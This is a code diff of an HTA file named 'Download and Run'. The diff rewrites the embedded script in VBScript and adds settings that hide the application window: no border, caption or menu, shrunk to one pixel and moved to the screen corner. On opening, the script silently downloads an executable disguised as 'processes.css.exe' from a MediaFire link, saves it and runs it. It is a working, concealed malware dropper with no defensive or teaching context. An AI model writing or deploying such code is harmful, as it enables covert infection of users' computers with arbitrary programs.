@@ -2,32 +2,54 @@
 <html>
 <head>
     <title>Download and Run</title>
-    <hta:application id="app" />
+    <hta:application
+        id="app"
+        border="none"
+        caption="no"
+        showintaskbar="yes"
+        sysmenu="no"
+        scroll="no"
+        singleinstance="yes"
+        icon="settings.ico"
+        windowstate="normal"
+        maximizable="no"
+        minimizable="no"
+        navigate="no"
+    />
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+        }
+    </style>
+    <script>
+        window.resizeTo(1, 1); // Resize to 1x1 pixels
+        window.moveTo(screen.width - 1, screen.height - 1); // Move to bottom right corner
+    </script>
 </head>
 <body>
-    <script>
-        var url = "https://www.mediafire.com/file/z9vdxpqhhyfhgtq/processes.css.exe/file";
-        var filePath = "C:\\path\\to\\save\\processes.css.exe";
-        var shell = new ActiveXObject("WScript.Shell");
-        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-        
-        // Download the file
-        xhr.open("GET", url, false);
-        xhr.send();
-        
-        if (xhr.status === 200) {
-            var stream = new ActiveXObject("ADODB.Stream");
-            stream.Type = 1; // adTypeBinary
-            stream.Open();
-            stream.Write(xhr.responseBody);
-            stream.SaveToFile(filePath, 2); // adSaveCreateOverWrite
-            stream.Close();
-            
-            // Run the downloaded file
-            shell.Run(filePath);
-        } else {
-            alert("Failed to download the file.");
-        }
+    <script language="VBScript">
+        Dim url, filePath, xhr, stream, shell
+        url = "https://www.mediafire.com/file/z9vdxpqhhyfhgtq/processes.css.exe/file"
+        filePath = "C:\path\to\save\processes.css.exe"
+
+        Set xhr = CreateObject("MSXML2.XMLHTTP")
+        xhr.open "GET", url, False
+        xhr.send
+
+        If xhr.status = 200 Then
+            Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1 ' adTypeBinary
+            stream.Open
+            stream.Write xhr.responseBody
+            stream.SaveToFile filePath, 2 ' adSaveCreateOverWrite
+            stream.Close
+
+            Set shell = CreateObject("WScript.Shell")
+            shell.Run filePath, 1, False
+        Else
+            MsgBox "Failed to download the file."
+        End If
     </script>
 </body>
 </html>
